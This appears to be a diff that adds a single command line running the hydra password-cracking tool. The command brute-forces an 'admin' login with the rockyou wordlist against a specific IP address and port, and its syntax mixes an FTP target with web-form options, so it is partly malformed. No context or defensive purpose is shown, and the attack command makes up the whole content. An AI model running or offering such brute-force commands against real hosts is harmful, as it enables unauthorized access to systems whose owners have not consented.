@@ -1,0 +1,4 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://159.65.208.41 module [http-post-form] "/ :password=^PASS^:Invalid password!" -s 40187
+
+
+
